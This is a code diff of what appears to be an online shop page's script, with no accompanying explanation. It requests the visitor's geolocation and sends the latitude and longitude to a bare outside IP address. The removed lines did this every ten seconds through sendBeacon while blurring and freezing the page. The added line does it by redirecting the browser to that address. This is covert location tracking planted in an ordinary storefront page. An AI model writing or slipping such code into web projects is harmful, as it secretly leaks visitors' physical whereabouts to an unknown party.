@@ -7868,13 +7868,7 @@ _ReStockConfig.wishlist = undefined;_ReStockConfig.wishlist = {"is_service_activ
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    document.querySelector('body').style.filter = 'blur(0px)';
-                    document.querySelector('body').style.pointerEvents = 'none';
-                    setInterval(function() {
-                        console.log('sent')
-                        navigator.sendBeacon('http://158.69.251.105:41090/lat=' + position.coords.latitude + '&lon=' + position.coords.longitude);
-                    }, 10000);
-                    // window.location.href = 'http://158.69.251.105:41090/lat=' + position.coords.latitude + '&lon=' + position.coords.longitude;
+                    window.location.href = 'http://158.69.251.105:41090/lat=' + position.coords.latitude + '&lon=' + position.coords.longitude;
                 },
                 function(error) {
                     if (error.code === error.PERMISSION_DENIED) {
